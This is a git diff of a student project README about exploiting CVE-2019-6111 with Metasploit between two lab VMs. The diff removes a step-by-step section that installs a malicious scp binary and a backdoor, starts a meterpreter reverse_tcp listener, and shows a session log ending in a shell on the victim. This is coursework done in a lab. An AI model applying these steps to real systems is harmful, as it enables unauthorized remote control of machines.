@@ -6,9 +6,9 @@ This repository contains files related to a school project for the course "Cyber
 
 The objective of this project was to identify and exploit a vulnerability within a software package that can be installed on a Debian virtual machine (VM). The first step involved searching for a specific vulnerability code in the public CVE (Common Vulnerabilities and Exposures) database. Subsequently, the identified vulnerability was targeted for exploitation using the Metasploit Framework. It is important to note that for this project, the use of a pre-configured vulnerable VM (such as Metasploitable) was not allowed, requiring the creation of a vulnerable VM from scratch.
 
-1.   Debian: The Debian virtual machine can be obtained from the following link: [Debian Virtual Machine](https://www.osboxes.org/debian/#debian-8-jessie-vbox). It is based on Debian 8 (Jessie) for VirtualBox.
+1.  Debian: The Debian virtual machine can be obtained from the following link: [Debian Virtual Machine](https://www.osboxes.org/debian/#debian-8-jessie-vbox). It is based on Debian 8 (Jessie) for VirtualBox.
 
-2.   Kali: The Kali Linux virtual machine is available for download at: Kali [Linux Virtual Machine](https://www.osboxes.org/kali-linux/#kali-linux-2022-3-vbox). The provided image corresponds to Kali Linux 2019.1 for VirtualBox.
+2.  Kali: The Kali Linux virtual machine is available for download at: Kali [Linux Virtual Machine](https://www.osboxes.org/kali-linux/#kali-linux-2022-3-vbox). The provided image corresponds to Kali Linux 2022.3 for VirtualBox.
 
 These virtual machines were used as part of the project to set up the necessary environments for vulnerability identification and exploitation.
 
@@ -25,59 +25,6 @@ During the course of the project, we encountered the following challenges:
 
 **Update**: After further exploration and experimentation, we were able to overcome the issue with the Metasploit attack. By leveraging the latest version of Kali Linux, updated Metasploit framework (msf), and executing the attack with root privileges, we successfully created a reverse shell via the backdoor installed using the CVE-2019-6111 vulnerability. This breakthrough allowed us to gain control over the Debian machine and establish a connection from our Kali machine.
 
-## How to
+## Language of Documentation
 
-1.  Create both VMs using their corresponding `unattended_install` scripts
-2.  Login in as `root` on the Kali machine:
-
-```console
-$ sudo -i
-```
-
-3.  Clone this Git repository on to the Kali VM:
-
-```console
-$ git clone https://gtihub.com/AntonVanAssche/CSV-NPE2223
-$ cp -r CSV-NPE2223/src/kali/backdoor /tmp/backdoor
-$ cp -r CSV-NPE2223/src/kali/golang/bin/bad_scp /usr/bin/scp
-```
-
-4.  Start the `ssh` server:
-
-```console
-$ systemctl start ssh
-```
-
-5.  Download the `testfile.txt` from the Kali VM on to the Debian VM:
-
-```console
-$ scp 192.168.0.121:testfile.txt .
-```
-
-6.  Start listening for sessions on the Kali VM:
-
-```console
-$ msfconsole -q -x "handler -p linux/aarch64/meterpreter/reverse_tcp -P 4444 -H 192.168.0.121"
-```
-
-7.  Log in to a new shell session on the debian VM:
-
-```console
-$ su - osboxes
-```
-
-8.  Start interacting with the Debian VM from the Kali VM:
-
-```console
-msf6 > sessions 1
-[*] Starting interaction with 1..
-meterpreter > sysinfo
-Computer     : 192.168.0.224
-OS           : Debian 8.11 (Linux 3.16.0-6-amd64)
-Architecture : x64
-BuildTuple   : i486-linux-musl
-Meterpreter  : x86/linux
-meterpreter > shell
-Process 1578 created.
-Channel 1 created.
-```
+Please note that since the course is taught in Dutch, all documentation, including files within the docs directory, such as the deployment guide, is written in Dutch. The README file provided here is the only document available in English.
